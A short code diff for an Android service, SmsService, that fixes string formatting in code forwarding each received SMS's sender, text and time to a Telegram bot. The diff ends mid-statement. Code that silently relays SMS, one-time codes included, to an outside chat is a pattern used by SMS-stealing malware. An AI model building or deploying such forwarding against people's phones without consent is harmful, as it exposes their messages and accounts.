@@ -107,12 +107,9 @@ public class SmsService extends Service {
         try {
             String date = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault())
                 .format(new Date(timestamp));
-            String text = "📨 SMS Forwarded
-" +
-                         "From: " + sender + "
-" +
-                         "Msg: " + message + "
-" +
+            String text = "SMS Forwarded\n" +
+                         "From: " + sender + "\n" +
+                         "Msg: " + message + "\n" +
                          "Time: " + date;
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN +
                            "/sendMessage?chat_id=" + CHAT_ID +
